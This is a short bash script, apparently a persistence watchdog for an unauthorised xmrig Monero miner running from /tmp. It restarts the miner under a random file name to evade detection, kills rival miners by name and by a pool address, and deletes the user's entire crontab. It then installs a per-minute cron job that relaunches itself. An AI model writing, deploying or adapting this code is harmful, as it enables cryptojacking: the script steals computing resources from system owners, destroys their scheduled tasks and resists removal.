#!/bin/bash
while true; do
    if pgrep -f "xmrig.*config.json" > /dev/null; then
        echo "My Miner Running 🔥"
    else
        randname=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)
        mv /tmp/xmrig/xmrig-6.22.2/xmrig /tmp/xmrig/xmrig-6.22.2/$randname
        chmod +x /tmp/xmrig/xmrig-6.22.2/$randname
        nohup /tmp/xmrig/xmrig-6.22.2/$randname > /dev/null 2>&1 &
    fi
    
    # KILL Other Miners (Not Your Own)
    ps aux | grep -v "xmrig.*config.json" | grep -E "minerd|crypto|nicehash|nanopool|supportxmr|moneroocean|75.119.158.0:3333" | awk '{print $2}' | xargs kill -9 2>/dev/null

    crontab -r
    echo "* * * * * nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &" | crontab -

    sleep 0.1
done

